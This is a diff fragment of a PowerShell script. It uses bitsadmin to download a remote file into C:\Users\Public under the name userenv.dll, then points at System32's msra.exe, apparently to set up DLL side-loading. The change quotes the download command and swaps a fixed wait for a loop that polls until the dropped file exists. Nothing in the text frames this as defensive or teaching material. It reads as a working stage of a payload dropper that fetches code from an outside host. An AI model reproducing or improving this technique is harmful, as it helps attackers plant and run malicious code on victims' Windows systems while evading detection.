@@ -94,10 +94,19 @@ $local_path = "C:\Users\Public\userenv.dll"
 $job_name = "FileDownload"
 $command = "bitsadmin /transfer $job_name"
 $command += " /download $remote_url $local_path"
-cmd.exe /c $command
+cmd.exe /c "$command"
 
-# Wait for the download to complete
-Start-Sleep -Seconds 5
+# Loop forever until the file exists
+do {
+    if(Test-Path $local_path) {
+        Write-Host "File exists!"
+        break
+    }
+    else {
+        Write-Host "File does not exist. Waiting..."
+        Start-Sleep -Seconds 10
+    }
+} while($true)
 
 # Set the source file path
 $source_file_path = "C:\Windows\System32\msra.exe"
